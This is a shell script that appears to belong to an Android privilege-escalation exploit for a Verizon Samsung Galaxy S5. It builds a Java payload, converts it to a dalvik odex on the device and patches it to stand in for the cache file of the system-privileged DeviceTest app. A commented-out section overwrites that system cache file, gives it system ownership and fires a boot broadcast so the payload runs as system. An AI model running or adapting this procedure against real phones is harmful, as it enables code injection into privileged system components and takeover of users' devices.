#! /bin/sh

TMP_DIR=`mktemp -d /tmp/${tempfoo}.XXXXXX`
CLASS_NAME=com.sec.factory.entry.FactoryTestBroadcastReceiver;

JAR_NAME=payload.jar
# This is the cache file we want to target because it is the only dalvik cache file ran as system on the vzw s55555
# root@kltevzw:/data/dalvik-cache # ls -l | grep DeviceTest
# -rw-r--r-- system   system       2536 2014-09-15 14:29 system@priv-app@DeviceTest.apk@classes.dex

TARGET_APK=bin/targetAPKS/SM-G900V_KTU84P_DeviceTest.apk
LOCAL_D_CACHE_FILE=/data/local/tmp/dalvik-cache/data@local@tmp@$JAR_NAME@classes.dex
TARGET_D_CACHE_FILE=/data/dalvik-cache/system@priv-app@DeviceTest.apk@classes.dex

#if [ $1 = "build" ]; then
javac -Xlint -classpath bin/android.jar  payload/*.java -d $TMP_DIR && \
dx --dex --no-strict --output=$TMP_DIR/classes.dex  $TMP_DIR/ && \
zip -j $TMP_DIR/$JAR_NAME $TMP_DIR/classes.dex && \
ls -l $TMP_DIR/$JAR_NAME && \
adb wait-for-device push $TMP_DIR/$JAR_NAME /data/local/tmp/ && \
adb shell rm -rf /data/local/tmp/dalvik-cache && \
adb shell mkdir /data/local/tmp/dalvik-cache && \
adb shell ANDROID_DATA=/data/local/tmp dalvikvm -cp /data/local/tmp/$JAR_NAME $CLASS_NAME && \
adb pull $LOCAL_D_CACHE_FILE $TMP_DIR/blah.odex && \
python patch_odex.py patch $TMP_DIR/blah.odex $TARGET_APK
#fi

#if [ $1 = "push" ]; then
#adb push patched.odex $LOCAL_D_CACHE_FILE && \
#adb shell ls -l $LOCAL_D_CACHE_FILE && \
#adb shell su -c "cp $LOCAL_D_CACHE_FILE $TARGET_D_CACHE_FILE" && \
#adb shell su -c "chown 1000.1000 $TARGET_D_CACHE_FILE" && \
#adb shell su -c "chmod 644 $TARGET_D_CACHE_FILE"  && \
#adb shell su -c "ls -l $TARGET_D_CACHE_FILE"  && \
## this triggers a DeviceTest broadcast receiver
#adb shell am broadcast -a android.intent.action.PRE_BOOT_COMPLETED  && \
#adb shell su -c "ls -l /data/dalvik-cache/system@priv-app@DeviceTest.apk@classes.dex"
#fi
